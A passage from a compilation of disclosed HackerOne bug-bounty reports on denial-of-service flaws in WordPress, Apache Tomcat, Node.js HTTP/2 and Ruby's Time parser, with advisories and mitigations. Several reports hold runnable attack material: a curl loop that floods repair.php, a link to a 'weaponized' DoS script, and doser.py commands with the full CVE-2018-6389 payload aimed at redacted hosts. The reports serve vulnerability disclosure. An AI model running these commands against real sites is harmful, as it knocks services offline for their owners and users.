3. Note that the page allows access without authentication. Select either the "Repair Database" or "Repair and Optimize Database" button.
4. To exploit this vulnerability, repeatedly send GET requests to `http://target-site.com/wp-admin/maint/repair.php?repair=1` to trigger the database repair process.
   - You can use a simple bash script or a tool like `cURL` to automate the requests:
     ```bash
     while true; do curl -X GET "http://target-site.com/wp-admin/maint/repair.php?repair=1"; sleep 1; done
     ```
   - To be more practical, I have weaponized it with a simple python script that can bring the site down for as long as the attacker desires. The script is hosted at https://raw.githubusercontent.com/smaranchand/wreckair-db/refs/heads/main/wreckair-db.py?token=GHSAT0AAAAAACZBPSANBXQSCUVHV6JYC2LUZYQVXVQ

      Note: Let me know if it is not accessible.
5. Observe that the repeated requests will eventually exhaust server resources, causing the site to become unresponsive, results in a Denial of Service (DoS) condition, impacting the availability of the target WordPress site.

## Supporting Material/References:
{F3684807}

## Impact

The impact of this vulnerability is severe, as it allows an unauthenticated attacker to make the target WordPress site unresponsive through repeated use of the database repair functionality. This Denial of Service (DoS) condition disrupts the availability of the website, rendering it inaccessible to legitimate users. The lack of authentication and rate limiting on a critical function makes it easy for attackers to exploit, resulting in significant downtime, potential loss of business, and damage to the reputation of the affected website. Additionally, this vulnerability has been active for a long time, going unreported and unnoticed, making it a persistent threat to WordPress installations that enable the repair feature without proper security measures.

## Mitigations

To mitigate this vulnerability, the following actions are recommended:

1. **Require Authentication**: WordPress should require authentication for accessing the `/wp-admin/maint/repair.php` endpoint, even when `WP_ALLOW_REPAIR` is set to `true`. This would ensure that only authorized users can initiate database repair operations.

2. **Restrict Access**: Implement IP-based access control to limit access to the repair page only to trusted IP addresses. This would prevent unauthorized users from accessing the endpoint.

3. **Use a One-Time Token Mechanism**: Introduce a secure one-time token mechanism to allow temporary access to the repair page. This token should expire after a short period, reducing the risk of exploitation.

4. **Rate Limiting**: Apply rate limiting to the `/wp-admin/maint/repair.php` endpoint to restrict how frequently repair requests can be made. This will help mitigate the risk of resource exhaustion through repeated requests.

By implementing these mitigations, the risk associated with this vulnerability can be significantly reduced, ensuring that the database repair functionality is only used by authorized personnel and cannot be abused to create a DoS condition.

---

### [CVE-2024-34750 Apache Tomcat DoS vulnerability in HTTP/2 connector](https://hackerone.com/reports/2586226)

- **Report ID:** `2586226`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Internet Bug Bounty
- **Reporter:** @devme4f
- **Bounty:** 4920 usd
- **Disclosed:** 2024-07-05T03:12:26.473Z
- **CVE(s):** CVE-2024-34750

**Vulnerability Information:**

Hello IBB team, i would like to submit a report about Apache Tomcat DoS vulnerability that i have reported to the Tomcat team, which was assigned to CVE-2024-34750 and disclosed yesterday.

**Details:**
When processing an HTTP/2 stream, Tomcat did not handle some cases of excessive HTTP headers correctly. This led to a miscounting of active HTTP/2 streams which in turn led to the use of an incorrect infinite timeout which allowed connections to remain open which should have been closed.

**Here is the email thread that i contacted the security team:**
██████████

## Impact

Since HTTP/2 connections are left open indefinitely, depending on configuration the DoS is caused either by the server running out of memory or by the open connections reaching maxConnections.

**Summary (team):**

###CVE-2024-34750 Apache Tomcat - Denial of Service

Severity: Important

Vendor: The Apache Software Foundation

Versions Affected:
Apache Tomcat 11.0.0-M1 to 11.0.0-M20
Apache Tomcat 10.1.0-M1 to 10.1.24
Apache Tomcat 9.0.0-M1 to 9.0.89

Description:
When processing an HTTP/2 stream, Tomcat did not handle some cases of
excessive HTTP headers correctly. This led to a miscounting of active
HTTP/2 streams which in turn led to the use of an incorrect infinite
timeout which allowed connections to remain open which should have been
closed.

Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 11.0.0-M21 or later
- Upgrade to Apache Tomcat 10.1.25 or later
- Upgrade to Apache Tomcat 9.0.90 or later

Credit:
This vulnerability was reported responsibly to the Tomcat security team
by devme4f from VNPT-VCI.

---

### [Assertion failed in node::http2::Http2Session::~Http2Session() leads to HTTP/2 server crash](https://hackerone.com/reports/2453328)

- **Report ID:** `2453328`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Internet Bug Bounty
- **Reporter:** @bart
- **Bounty:** 3645 usd
- **Disclosed:** 2024-04-29T21:01:40.904Z
- **CVE(s):** CVE-2024-27983

**Vulnerability Information:**

An attacker can make the Node.js HTTP/2 server completely unavailable by sending a small amount of HTTP/2 frames packets with a few HTTP/2 frames inside. It is possible to leave some data in nghttp2 memory after reset when headers with HTTP/2 CONTINUATION frame are sent to the server and then a TCP connection is abruptly closed by the client triggering the Http2Session destructor while header frames are still being processed (and stored in memory) causing a race condition.

* Advisory: https://nodejs.org/en/blog/vulnerability/april-2024-security-releases
* HackerOne report: 2319584

## Impact

Server crashes instantly after sending a few HTTP/2 frames.

**Summary (team):**

Assertion failed in node::http2::Http2Session::~Http2Session() leads to HTTP/2 server crash (CVE-2024-27983) - (High)
An attacker can make the Node.js HTTP/2 server completely unavailable by sending a small amount of HTTP/2 frames packets with a few HTTP/2 frames inside. It is possible to leave some data in nghttp2 memory after reset when headers with HTTP/2 CONTINUATION frame are sent to the server and then a TCP connection is abruptly closed by the client triggering the Http2Session destructor while header frames are still being processed (and stored in memory) causing a race condition.

Impacts:

This vulnerability affects all users in all active release lines: 18.x, 20.x and, 21.x.

Thank you, to bart for reporting this vulnerability and Anna Henningsen for fixing it.

Full Security Advisory: https://nodejs.org/en/blog/vulnerability/april-2024-security-releases

---

### [Denial of Service caused by HTTP/2 CONTINUATION Flood](https://hackerone.com/reports/2334401)

- **Report ID:** `2334401`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Internet Bug Bounty
- **Reporter:** @bart
- **Bounty:** 4860 usd
- **Disclosed:** 2024-04-22T19:52:39.534Z
- **CVE(s):** CVE-2024-24549

**Vulnerability Information:**

I sent the following report to Apache Tomcat Security Team. They confirmed the report and assigned CVE-2024-24549. I'd like to ask if this is eligible for a bounty.

I'd like to report a DoS vulnerability in Tomcat. I tested 10.1.18 and 11.0 (tomcat:latest and tomcat:11.0 docker images respectively) and it seems that both are vulnerable.

An attacker can send headers using HTTP/2 CONTINUATION frames up to the limit of header bytes, header size and connection overhead so that connection is not dropped by a server (GOAWAY/ENHANCE_YOUR_CALM). Once frames are sent a connection is left intact and a new connection starts. After a few connections like these the server crashes with (java.lang.OutOfMemoryError: Java heap space) in the code connected to HPackHuffman decoding.

The lack of experience with Java does not allow me to debug this properly to give you a definitive answer what is causing the problem however here is my best guess:
* When sending HEADERS + N * CONTINUATION frames are sent the actual headers are stored in memory.
* When TCP connection is idle (and possibly when connection is dropped) the headers stay in memory.
* Because of this even a small number of connections are able to occupy hundreds of MB of server memory.

I'm attaching an exploit (in Golang) with reproduction steps:
* Start tomcat docker container (-m 800m limits memory to 800MB just to prove the point faster):
    `docker run -m 800m -d -p 7777:8080 --name tomcat tomcat:latest`
* SSH into a container to enable HTTP/2 (https://tomcat.apache.org/tomcat-8.5-doc/config/http.html#HTTP/2_Support).
* Stop and start container to pick up new config:
    `docker stop tomcat`
    `docker start tomcat`
* Run exploit:
    `go run exploit.go -address "[ip]:7777" -connections 50`

To test it I started a remote EC2 server. After a few seconds after the exploit starts the server becomes unresponsive, CPU goes to 100% and memory usage fills quickly (observe with docker stats). After a few seconds you'll see OOM errors in catalina log (see attachment). While the CPU will drop to 0% soon, no new connections will be processed by the server even when the exploit is not running anymore.

Here's how exploit.go works:
* It pregenerates 100 headers, each 10 chars long.
* It starts connections (-connections flag means how many active connections can be running at a time). Each connection:
    * Sends HEADERS frame.
    * Sends 8 CONTINUATION frames, each consists of 100 random headers (10 chars name and 10 chars value). These params are almost reaching the header size limits but not exceeding them so connection is not dropped.
    * Once headers are sent, connection is left intact and new connection starts.

It seems that finding a reason why the server is crashing can be challenging for the server admin because even a single full HTTP request is not made (note that the last CONTINUATION frame doesn't have END_HEADERS flag) so they won't see HTTP requests in the logs. I'm not aware of any configuration params that can prevent this attack. Thus, it seems the only mitigation is turning off HTTP/2 support (or code fix).

## Impact

It causes a server crash so complete availability loss.

**Summary (team):**

CVE-2024-24549 Apache Tomcat - Denial of Service
Severity: Important

Vendor: The Apache Software Foundation

Versions Affected:
Apache Tomcat 11.0.0-M1 to 11.0.0-M16
Apache Tomcat 10.1.0-M1 to 10.1.18
Apache Tomcat 9.0.0-M1 to 9.0.85
Apache Tomcat 8.5.0 to 8.5.98

Description:
When processing an HTTP/2 request, if the request exceeded any of the
configured limits for headers, the associated HTTP/2 stream was not
reset until after all of the headers had been processed.

Mitigation:
Users of the affected versions should apply one of the following
mitigations:
- Upgrade to Apache Tomcat 11.0.0-M17 or later
- Upgrade to Apache Tomcat 10.1.19 or later
- Upgrade to Apache Tomcat 9.0.86 or later
- Upgrade to Apache Tomcat 8.5.99 or later

Credit:
This vulnerability was reported responsibly to the Tomcat security team
by Bartek Nowotarski (https://nowotarski.info/).

Full Security Advisory: https://lists.apache.org/thread/4c50rmomhbbsdgfjsgwlb51xdwfjdcvg

---

### ["Assertion failed" in node::http2::Http2Session::~Http2Session() leads to HTTP/2 server crash](https://hackerone.com/reports/2319584)

- **Report ID:** `2319584`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js
- **Reporter:** @bart
- **Bounty:** - usd
- **Disclosed:** 2024-04-08T22:25:42.342Z
- **CVE(s):** CVE-2024-27983

**Vulnerability Information:**

**Summary:**

I discovered a vulnerability in Node.js HTTP/2 stack (`http2`) package. An attacker can send a very small amount of TCP packets with a few HTTP/2 frames inside. After a few seconds a Node.js (latest: 21.5.0 and latest LTS: v20.11.0) server crash with the following stack:
```
  #  node[3253]: virtual node::http2::Http2Session::~Http2Session() at ../src/node_http2.cc:534
  #  Assertion failed: (current_nghttp2_memory_) == (0)

----- Native stack trace -----

 1: 0xca5430 node::Abort() [node]
 2: 0xca54b0 node::errors::SetPrepareStackTraceCallback(v8::FunctionCallbackInfo<v8::Value> const&) [node]
 3: 0xce7156 node::http2::Http2Session::~Http2Session() [node]
 4: 0xce7192 node::http2::Http2Session::~Http2Session() [node]
 5: 0x106f01d v8::internal::GlobalHandles::InvokeFirstPassWeakCallbacks() [node]
 6: 0x10f3215 v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::internal::GarbageCollectionReason, char const*) [node]
 7: 0x10f3d7c v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) [node]
 8: 0x10ca081 v8::internal::HeapAllocator::AllocateRawWithLightRetrySlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) [node]
 9: 0x10cb215 v8::internal::HeapAllocator::AllocateRawWithRetryOrFailSlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) [node]
10: 0x10a8866 v8::internal::Factory::NewFillerObject(int, v8::internal::AllocationAlignment, v8::internal::AllocationType, v8::internal::AllocationOrigin) [node]
11: 0x15035f6 v8::internal::Runtime_AllocateInYoungGeneration(int, unsigned long*, v8::internal::Isolate*) [node]
12: 0x7f41df699ef6 
Aborted (core dumped)
```
The attack is easy to perform so a permanent Denial of Service is possible. It is also hard to debug from server admins (check Impact section).

**Description:**

The `http2` package has an  assertion in the `Http2Session` destructor which check if current memory usage of nghttp2 library (`current_nghttp2_memory_`) has been reset to 0.
```c++
Http2Session::~Http2Session() {
  CHECK(!is_in_scope());
  Debug(this, "freeing nghttp2 session");
  // Explicitly reset session_ so the subsequent
  // current_nghttp2_memory_ check passes.
  session_.reset();
  CHECK_EQ(current_nghttp2_memory_, 0);
}
```
However it is possible to leave some data in nghttp2 memory (or counter is improperly implemented) after reset when headers with HTTP/2 [`CONTINUATION` frame](https://datatracker.ietf.org/doc/html/rfc9113#name-continuation) are sent to the server and then a TCP connection is abruptly closed by the client triggering the `Http2Session` destructor while header frames are still being processed (and stored in memory).

## Steps To Reproduce:

  1. Start a `http2` server.
  2. Send a HTTP/2 request:
     * Send necessary init frames.
     * Send `HEADERS` frame for a simple `GET /` request (with no `END_HEADERS` flag).
     * Send `CONTINUATION` frame with a single header (also with no `END_HEADERS` flag).
  3. Disconnect TCP connection.

I'm attaching an exploit in Golang that demonstrates the issue. It starts a loop and in each iteration it opens a TCP connection to the server. It sends necessary headers and then just leaves the connection open. After 10 seconds, another go routine simply exists the application which kills all opened TCP connections which triggers the bug. To run it simply run: `go run ./exploit2.go -address [server]`. For simplicity it works only for `h2c` (HTTP/2 without TLS) server but with extra code it should work against any Node.js server (with TLS).

I was testing it against the simple Node.js server:
```nodejs
const http2 = require('http2');
const fs = require('fs');

const server = http2.createServer();

server.on('error', (err) => console.error(err));

server.on('stream', (stream, headers) => {
    // Respond to the request with a simple hello world message
    stream.respond({
        'content-type': 'text/plain; charset=utf-8',
        ':status': 200
    });
    stream.end('Hello World with HTTP/2!');
    console.log("Request handled")
});

server.listen(7777, () => {
    console.log('Server is running on http://localhost:7777');
});
```

## Impact

An attacker can make the Node.js HTTP/2 server completely unavailable. Because of the fact that send HTTP/2 frames never establish a full HTTP request, the server admins may have problems with debugging the issue or rate-limiting the attacker (requests not visible in the logs). The payload sent to exploit the issue is also very small.

Additionally, an attack can cause some problems with data integrity because `GOAWAY` frames will not be sent but they contain (often important): `Last-Stream-ID` parameter, from specification:
> The last stream identifier in the GOAWAY frame contains the highest-numbered stream identifier for which the sender of the GOAWAY frame might have taken some action on or might yet take action on. All streams up to and including the identified stream might have been processed in some way.

This means that clients may submit duplicate request for request that have been already processed by a server.

**Summary (team):**

An attacker can make the Node.js HTTP/2 server completely unavailable by sending a small amount of HTTP/2 frames packets with a few HTTP/2 frames inside. It is possible to leave some data in nghttp2 memory after reset when headers with HTTP/2 CONTINUATION frame are sent to the server and then a TCP connection is abruptly closed by the client triggering the Http2Session destructor while header frames are still being processed (and stored in memory) causing a race condition.

---

### [http: Reading unprocessed HTTP request with unbounded chunk extension allows DoS attacks](https://hackerone.com/reports/2375446)

- **Report ID:** `2375446`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Internet Bug Bounty
- **Reporter:** @bart
- **Bounty:** 3495 usd
- **Disclosed:** 2024-03-05T12:09:56.321Z
- **CVE(s):** CVE-2024-22019

**Vulnerability Information:**

I'd like to report Node.js vulnerability (CVE-2024-22019) that was recently fixed:
- HackerOne report: https://hackerone.com/reports/2233486
- Release notes: https://nodejs.org/en/blog/vulnerability/february-2024-security-releases

## Impact

This is a major issue because it allows unbounded resource (CPU, network bandwidth) consumption of the standard Node.js http server. The standard methods which could help blocking a malicious requests like timeouts and limiting request body size do not seem to work.

**Summary (team):**

Reading unprocessed HTTP request with unbounded chunk extension allows DoS attacks (CVE-2024-22019) - (High)
A vulnerability in Node.js HTTP servers allows an attacker to send a specially crafted HTTP request with chunked encoding, leading to resource exhaustion and denial of service (DoS).

The server reads an unbounded number of bytes from a single connection, exploiting the lack of limitations on chunk extension bytes.

The issue can cause CPU and network bandwidth exhaustion, bypassing standard safeguards like timeouts and body size limits.

Impacts:

This vulnerability affects all users in all active release lines: 18.x, 20.x, and 21.x.
Thank you, to Bartek Nowotarski for reporting this vulnerability and thank you Paolo Insogna for fixing it.

Full Security Advisory: https://nodejs.org/en/blog/vulnerability/february-2024-security-releases

---

### [http: Reading unprocessed HTTP request with unbounded chunk extension allows DoS attacks](https://hackerone.com/reports/2233486)

- **Report ID:** `2233486`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js
- **Reporter:** @bart
- **Bounty:** - usd
- **Disclosed:** 2024-02-15T18:10:10.187Z
- **CVE(s):** CVE-2024-22019

**Summary (team):**

A vulnerability in Node.js HTTP servers allows an attacker to send a specially crafted HTTP request with chunked encoding, leading to resource exhaustion and denial of service (DoS). The server reads an unbounded number of bytes from a single connection, exploiting the lack of limitations on chunk extension bytes. The issue can cause CPU and network bandwidth exhaustion, bypassing standard safeguards like timeouts and body size limits.

---

### [ReDoS( Ruby, Time)](https://hackerone.com/reports/1929567)

- **Report ID:** `1929567`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Internet Bug Bounty
- **Reporter:** @ooooooo_q
- **Bounty:** 4000 usd
- **Disclosed:** 2023-04-26T03:36:32.774Z
- **CVE(s):** CVE-2023-28756

**Vulnerability Information:**

I reported at https://hackerone.com/reports/1485501

https://www.ruby-lang.org/en/news/2023/03/30/redos-in-time-cve-2023-28756/
> The Time parser mishandles invalid strings that have specific characters. It causes an increase in execution time for parsing strings to Time objects.
> A ReDoS issue was discovered in the Time gem 0.1.0 and 0.2.1 and Time library of Ruby 2.7.7.

## Impact

ReDoS occurs when `Time.rfc2822` accepts user input.

In `Rack::ConditionalGet`, the header value is parsed by `Time.rfc2822`,  it is possible to attack from the request.
Rails uses `::Rack::ConditionalGet` by default, it can be attacked by a request from the client.

**Summary (team):**

CVE-2023-28756: ReDoS vulnerability in Time

We have released the time gem version 0.1.1 and 0.2.2 that has a security fix for a ReDoS vulnerability. This vulnerability has been assigned the CVE identifier CVE-2023-28756.

Details
The Time parser mishandles invalid strings that have specific characters. It causes an increase in execution time for parsing strings to Time objects.

A ReDoS issue was discovered in the Time gem 0.1.0 and 0.2.1 and Time library of Ruby 2.7.7.

Recommended action
We recommend to update the time gem to version 0.2.2 or later. In order to ensure compatibility with bundled version in older Ruby series, you may update as follows instead:

For Ruby 3.0 users: Update to time 0.1.1
For Ruby 3.1/3.2 users: Update to time 0.2.2
You can use gem update time to update it. If you are using bundler, please add gem "time", ">= 0.2.2" to your Gemfile.

Unfortunately, time gem only works with Ruby 3.0 or later. If you are using Ruby 2.7, please use the latest version of Ruby.

Affected versions
Ruby 2.7.7 or lower
time gem 0.1.0
time gem 0.2.1

Credits
Thanks to ooooooo_q for discovering this issue.

Security Advisory: https://www.ruby-lang.org/en/news/2023/03/30/redos-in-time-cve-2023-28756/

---

### [ WordPress application vulnerable to DoS attack via wp-cron.php](https://hackerone.com/reports/1888723)

- **Report ID:** `1888723`
- **Severity:** Critical
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0r10nh4ck
- **Bounty:** - usd
- **Disclosed:** 2023-04-14T17:24:48.885Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
Hi team,

The WordPress application is vulnerable to a Denial of Service (DoS) attack via the wp-cron.php script. This script is used by WordPress to perform scheduled tasks, such as publishing scheduled posts, checking for updates, and running plugins.

An attacker can exploit this vulnerability by sending a large number of requests to the wp-cron.php script, causing it to consume excessive resources and overload the server. This can lead to the application becoming unresponsive or crashing, potentially causing data loss and downtime.

I found this vulnerability at https://████████ endpoint.

## References

https://developer.wordpress.org/plugins/cron/

## Impact

A successful attack on this vulnerability can result in the following consequences:

    - Denial of Service (DoS) attacks, rendering the application unavailable.
    - Server overload and increased resource usage, leading to slow response times or application crashes.
   -  Potential data loss and downtime.

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Get the doser.py script at https://github.com/Quitten/doser.py
2. Use this command to run the script:
```
python3 doser.py -t 999 -g 'https://█████/wp-cron.php'
```
3. Go to https://████ after 1000 requests of the doser.py script.
4. The site returns code 502.
5. See the video PoC.

## Suggested Mitigation/Remediation Actions
To mitigate this vulnerability, it is recommended to disable the default WordPress wp-cron.php script and set up a server-side cron job instead.
Here are the steps to disable the default wp-cron.php script and set up a server-side cron job:

   1.  Access your website's root directory via FTP or cPanel File Manager.
   2.  Locate the wp-config.php file and open it for editing.
   3.  Add the following line of code to the file, just before the line that says "That's all, stop editing! Happy publishing.":
```
define('DISABLE_WP_CRON', true);
```
   4.  Save the changes to the wp-config.php file.
   5. Set up a server-side cron job to run the wp-cron.php script at the desired interval. This can be done using the server's control panel or by editing the server's crontab file.

---

### [DoS at █████(CVE-2018-6389)](https://hackerone.com/reports/1887996)

- **Report ID:** `1887996`
- **Severity:** Critical
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** U.S. Dept Of Defense
- **Reporter:** @a4hamkhan
- **Bounty:** - usd
- **Disclosed:** 2023-03-24T17:34:39.433Z
- **CVE(s):** CVE-2018-6389

**Vulnerability Information:**

**Description:**

Unauthenticated attackers can cause a denial of service (resource consumption) listing a large number of registered .js files (from wp-includes/script-loader.php)

Vulnerable Url : https://██████████/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter

**Vulnerability**

An attacker can now use the below tool to implement the attack
- https://github.com/quitten/doser.py
command : python3 doser.py -g "https://██████/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter" -t 999

## Impact

Attackers can use this vulnerable function to deplete server resources and launch denial of service attacks.

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2018-6389

## Steps to Reproduce
1. clone this tool https://github.com/quitten/doser.py
2. now go to the directory of the cloned tool
3. now execute this command :
python3 doser.py -g "https://█████/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter" -t 999

## Suggested Mitigation/Remediation Actions

---

### [DoS at ████████ (CVE-2018-6389)](https://hackerone.com/reports/1861569)

- **Report ID:** `1861569`
- **Severity:** Critical
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** U.S. Dept Of Defense
- **Reporter:** @raditz
- **Bounty:** - usd
- **Disclosed:** 2023-02-24T18:59:58.789Z
- **CVE(s):** CVE-2018-6389

**Vulnerability Information:**

Hi DoD Team!

##Description

Unauthenticated attackers can cause a denial of service (resource consumption) by using the large list of registered .js files (from wp-includes/script-loader.php) to construct a series of requests to load every file many times.

The vulnerability is registered as [CVE-2018-6389](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389).

WordPress allows users to load multiple JS files and CSS files through load-scripts.php files at once. However, the number and size of files are not restricted in the process of loading JS files, attackers can use this function to deplete server resources and launch denial of service attacks.

##Vulnerability

